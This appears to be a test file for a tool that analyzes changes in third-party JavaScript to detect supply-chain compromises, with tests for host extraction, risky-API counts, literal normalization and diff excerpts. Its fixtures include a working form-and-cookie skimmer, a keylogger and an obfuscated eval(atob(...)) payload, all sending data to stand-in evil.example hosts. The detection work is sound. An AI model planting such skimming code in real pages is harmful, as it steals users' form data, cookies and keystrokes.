import { describe, expect, it } from 'vitest';
import {
  analyze,
  beautify,
  countIndicators,
  hostsInCode,
  normalizeLiterals,
} from '../src/analyze.js';

const vendorV1 = `!function(){var e=window.vendor=window.vendor||{};e.init=function(t){e.id=t;e.endpoint="https://api.vendor.example/collect";};e.track=function(n){navigator.sendBeacon(e.endpoint,JSON.stringify(n))};}();`;

const skimmer = `${vendorV1}document.addEventListener("submit",function(f){var d=new FormData(f.target);fetch("https://cdn-analytics.evil.example/c",{method:"POST",body:btoa(JSON.stringify(Object.fromEntries(d))+document.cookie)})});`;

describe('hostsInCode', () => {
  it('finds hosts of absolute and protocol-relative URLs', () => {
    const code = `a="https://cdn.example.com/x.js";b='//t.example.net/p?x=1';c="wss://ws.example.org:443";d="http://10.0.0.1/c"`;
    expect([...hostsInCode(code)].sort()).toEqual([
      '10.0.0.1',
      'cdn.example.com',
      't.example.net',
      'ws.example.org',
    ]);
  });

  it('ignores namespaces and things that only look like URLs', () => {
    expect([...hostsInCode('x="http://www.w3.org/2000/svg"; y = 1//2.5')]).toEqual([]);
  });
});

describe('countIndicators', () => {
  it('counts risky APIs', () => {
    const counts = countIndicators(skimmer);
    expect(counts['form-access']).toBe(1);
    expect(counts['network']).toBe(2);
    expect(counts['cookies']).toBe(1);
    expect(counts['encoding']).toBe(1);
    expect(counts['dynamic-code']).toBe(0);
  });
});

describe('normalizeLiterals', () => {
  it('equalizes timestamps, numbers and request ids', () => {
    const a = 'f({"t":1795188732494,"rid":"a8f3k2m9x7q1w5e6r4","v":"m202611100101",n:686})';
    const b = 'f({"t":1795188744143,"rid":"z1x2c3v4b5n6m7l8k9","v":"m202611100101",n:376})';
    expect(normalizeLiterals(a)).toBe(normalizeLiterals(b));
  });

  it('equalizes build and commit hashes', () => {
    expect(normalizeLiterals('globalThis.__BUILD__ = `5b8fa22`;')).toBe(
      normalizeLiterals('globalThis.__BUILD__ = `3496065`;'),
    );
    expect(normalizeLiterals('x="deadbeefcafe"')).toBe('x="deadbeefcafe"');
  });

  it('keeps short ids such as analytics property ids distinguishable', () => {
    expect(normalizeLiterals('gtag("config","G-ABC123XY")')).not.toBe(
      normalizeLiterals('gtag("config","G-ZZZ999QQ")'),
    );
  });
});

describe('beautify', () => {
  it('formats minified code and falls back for code prettier cannot parse', async () => {
    expect((await beautify('function a(){return 1}var b=2;')).split('\n').length).toBeGreaterThan(
      2,
    );
    expect(await beautify('<html>{a;b}')).toBe('<html>{\na;\nb}');
  });
});

describe('analyze', () => {
  it('describes a new script with its hosts and indicators', async () => {
    const analysis = await analyze(Buffer.from(vendorV1), undefined, 50_000);
    expect(analysis.kind).toBe('new');
    expect(analysis.addedHosts).toEqual(['api.vendor.example']);
    expect(analysis.indicators.map((indicator) => indicator.name)).toEqual(['network']);
    expect(analysis.excerpt).toContain('sendBeacon');
    expect(analysis.omitted).toBe('');
    expect(analysis.literalOnly).toBe(false);
  });

  it('shows what a compromise added', async () => {
    const analysis = await analyze(Buffer.from(skimmer), Buffer.from(vendorV1), 50_000);
    expect(analysis.kind).toBe('changed');
    expect(analysis.addedHosts).toEqual(['cdn-analytics.evil.example']);
    expect(analysis.literalOnly).toBe(false);
    expect(analysis.indicators).toContainEqual({
      name: 'form-access',
      label: expect.any(String),
      old: 0,
      new: 1,
    });
    expect(analysis.excerpt).toMatch(/^\+.*addEventListener\("submit"/m);
    expect(analysis.excerpt).toMatch(/^\+.*cdn-analytics\.evil\.example/m);
  });

  it('marks changes of literal values only', async () => {
    const analysis = await analyze(
      Buffer.from('init({ts:1795188744143,cb:"q9w8e7r6t5y4u3i2o1"})'),
      Buffer.from('init({ts:1795188732494,cb:"a1s2d3f4g5h6j7k8l9"})'),
      50_000,
    );
    expect(analysis.literalOnly).toBe(true);
  });

  it('keeps the riskiest hunks when the diff is too long', async () => {
    const filler = (seed: string) =>
      Array.from({ length: 400 }, (_, i) => `function f${i}(){return "${seed}${i}"}`).join('\n');
    const oldCode = `${filler('a')}\nvar x=1;`;
    const newCode = `${filler('b')}\nvar x=1;document.addEventListener("keydown",function(e){fetch("https://k.evil.example/"+e.key)});`;
    const analysis = await analyze(Buffer.from(newCode), Buffer.from(oldCode), 12_000);
    expect(analysis.excerpt.length).toBeLessThanOrEqual(12_000);
    expect(analysis.excerpt).toContain('k.evil.example');
    expect(analysis.omitted).toMatch(/hunks are left out/);
  });

  it('shows the risky parts of a large new script', async () => {
    const big = `${'var pad = "x";\n'.repeat(20_000)}eval(atob("ZmV0Y2goJ2h0dHBzOi8vZXZpbC5leGFtcGxlJyk="));\n${'var tail = 1;\n'.repeat(5000)}`;
    const analysis = await analyze(Buffer.from(big), undefined, 20_000);
    expect(analysis.excerpt.length).toBeLessThanOrEqual(21_000);
    expect(analysis.excerpt).toContain('eval(atob(');
    expect(analysis.omitted).toMatch(/Only \d+%/);
  });
});
